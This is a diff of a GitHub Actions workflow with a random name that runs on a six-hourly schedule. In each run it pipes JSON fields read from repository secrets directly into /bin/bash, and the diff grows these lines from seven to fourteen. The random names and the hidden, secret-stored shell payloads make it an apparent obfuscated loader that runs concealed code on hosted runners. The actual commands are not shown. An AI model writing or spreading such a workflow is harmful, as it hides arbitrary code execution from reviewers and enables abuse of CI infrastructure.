@@ -1,10 +1,11 @@
 name: shiguzcesq
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '53 1/6 * * *'
+    - cron: '32 3/6 * * *'
 
-jobs:  # 14370
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +13,20 @@ jobs:  # 14370
       - uses: actions/checkout@v4
       - name: shiguzcesq
         env:
-          al5938: ${{ secrets.al5938 }}
+          ocu43: ${{ secrets.ocu43 }}
         run: |
-          echo $al5938 | jq -r .mqrmr34570 | /bin/bash
-          echo $rw4191 | jq -r .avews4 | /bin/bash
-          echo $owhqs3 | jq -r .iywn9282 | /bin/bash
-          echo $lmgge1 | jq -r .nbcpv516 | /bin/bash
-          echo $eofa2526 | jq -r .zwhd8483 | /bin/bash
-          echo $ib0181 | jq -r .uomq705 | /bin/bash
-          echo $uq37370 | jq -r .cbaxg8309 | /bin/bash
+          echo $ocu43 | jq -r .vgq992 | /bin/bash
+          echo $spn76 | jq -r .yqha87386 | /bin/bash
+          echo $nlb634 | jq -r .qcyw4944 | /bin/bash
+          echo $uys47 | jq -r .jpvsf897 | /bin/bash
+          echo $tbrco8 | jq -r .bkik646 | /bin/bash
+          echo $llxf32 | jq -r .qfwn0966 | /bin/bash
+          echo $cosn200 | jq -r .k02 | /bin/bash
+          echo $qjfmb677 | jq -r .e80 | /bin/bash
+          echo $oii395 | jq -r .ic964 | /bin/bash
+          echo $k5312 | jq -r .a35 | /bin/bash
+          echo $oxdsk141 | jq -r .vf93 | /bin/bash
+          echo $k31311 | jq -r .nntp66 | /bin/bash
+          echo $ihpti199 | jq -r .bxawz1989 | /bin/bash
+          echo $sqa7 | jq -r .nbpee946 | /bin/bash
 
